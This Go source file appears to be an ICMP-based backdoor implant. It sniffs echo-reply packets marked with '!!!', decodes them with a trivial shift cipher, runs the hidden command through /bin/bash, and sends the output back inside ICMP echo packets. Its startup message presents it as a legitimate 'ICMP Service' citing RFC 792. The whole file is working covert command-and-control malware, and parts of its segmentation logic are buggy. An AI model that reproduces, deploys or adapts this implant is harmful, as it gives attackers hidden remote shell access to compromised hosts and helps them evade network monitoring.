package main

import (
	"bytes"
	"fmt"
	"log"
	"net"
	"os/exec"
	"strconv"
	"strings"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

var DEBUG bool = true

var id int = 0
var clients = make(map[int]string)
var SSM bool = true
var execute = false
var KEY rune = 'B'
var PacketQueue []icmp.Message

var (
	buffer = int32(1600)
	filter = "icmp[icmptype] == icmp-echoreply"
)

var c, ListenerError = icmp.ListenPacket("ip4:icmp", "0.0.0.0")

const (
	ProtocolICMP = 1
)

func GenerateHeader(segment int, segmented bool, ip string) string {
	SegmentNum := strconv.Itoa(segment)
	header := "###"
	// ### is server flag
	// Value 1 (SSM) is Encryption option
	// Value 2 is execution option
	// Value 3 is segment for oversized packets
	// Value 4 is segment ID
	if SSM {
		header += "1"
	} else {
		header += "0"
	}
	if execute {
		header += "1"
	} else {
		header += "0"
	}
	if segmented {
		header += "1"
	} else {
		header += "0"
	}
	header += SegmentNum
	header += "[" + ip + "]" // Append IP to header for NAT
	return header
}

func MakePacket(payload string) {
	if SSM {
		payload = payload[0:8] + encrypt(payload[8:])
	}
	packet := icmp.Message{
		Type: ipv4.ICMPTypeEcho,
		Code: 0,
		Body: &icmp.Echo{
			ID:   0,
			Seq:  0,
			Data: []byte(payload),
		},
	}
	PacketQueue = append(PacketQueue, packet)
}

func SendPackets(addr string, c icmp.PacketConn) {
	for _, packet := range PacketQueue {
		binaryEncoding, _ := packet.Marshal(nil)
		dst, _ := net.ResolveIPAddr("ip4", addr)
		anInt, err := c.WriteTo(binaryEncoding, dst)

		if err != nil {
			fmt.Println("I FAILED DOG")
		} else if anInt != len(binaryEncoding) {
			fmt.Println("YOU FELL OFF")
		}
	}
}

func Send(message string, ClientIP string, ServerIP string) {
	if len(message) > 1460 {
		segment := 0
		for len(message) > 1460 {
			payload := GenerateHeader(segment, true, ClientIP) + message[0:1460]
			MakePacket(payload)
			SendPackets(clients[id], *c)
			message = message[1460:]
			segment++
		}
		payload := GenerateHeader(segment, true, ClientIP) + message[0:]
		MakePacket(payload)
	} else {
		payload := GenerateHeader(0, false, ClientIP) + message
		MakePacket(payload)
		SendPackets(ServerIP, *c)
	}
	PacketQueue = nil
}

func convert(nums []byte) string {
	var converted string
	converted = bytes.NewBuffer(nums).String()
	return converted
}

func encrypt(plaintext string) string {
	encrypted := ""
	for i := range plaintext {
		encrypted += string(rune(int(plaintext[i]) + 3))
	}
	return encrypted
}

func decrypt(plaintext string) string {
	encrypted := ""
	for i := range plaintext {
		encrypted += string(rune(int(plaintext[i]) - 3))
	}
	return encrypted
}

func SetFlags(header string) {
	if header[3] == '1' {
		SSM = true
	} else {
		SSM = false
	}
	if header[4] == '1' {
		execute = true
	} else {
		execute = false
	}
}

func sniffer() {
	handler, err := pcap.OpenLive("ens160", buffer, false, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer handler.Close()
	if err := handler.SetBPFFilter(filter); err != nil {
		log.Fatal(err)
	}
	source := gopacket.NewPacketSource(handler, handler.LinkType())
	for packet := range source.Packets() {
		payload := convert(packet.ApplicationLayer().Payload())
		if strings.HasPrefix(payload, "!!!") {
			parts := strings.SplitN(payload, "[", 2)

			// get the part before "["
			header := parts[0]
			SetFlags(header)

			// get the part after "["
			var AfterHeader string
			if SSM {
				AfterHeader = decrypt(parts[1])
			} else {
				AfterHeader = parts[1]
			}

			// split the string by "]"
			parts = strings.Split(AfterHeader, "]")

			// get the part before "]"
			ip := parts[0]

			// fmt.Println("Header:", header)
			// fmt.Println("IP:", ip)
			// fmt.Println("Command:", parts[1])
			ipLayer := packet.Layer(layers.LayerTypeIPv4)
			ServerIP, _ := ipLayer.(*layers.IPv4)
			var out []byte
			var err error
			if execute {
				cmd := exec.Command("/bin/bash", "-c", parts[1])
				out, err = cmd.CombinedOutput()
			} else {
				if parts[1] == "ping" {
					out = []byte("pong")
				}
			}
			if err != nil {
				Send(string(err.Error()), ip, ServerIP.DstIP.String())
			} else {
				Send(string(out), ip, ServerIP.DstIP.String())
			}
		} else {
			continue
		}
	}
}

func main() {
	fmt.Println("ICMP Service started. Please consult RFC 792 for implementation details.")
	fmt.Println("For ICMP Service information, consult the Linux Github.")
	go sniffer()
	for true {
		continue
	}
}
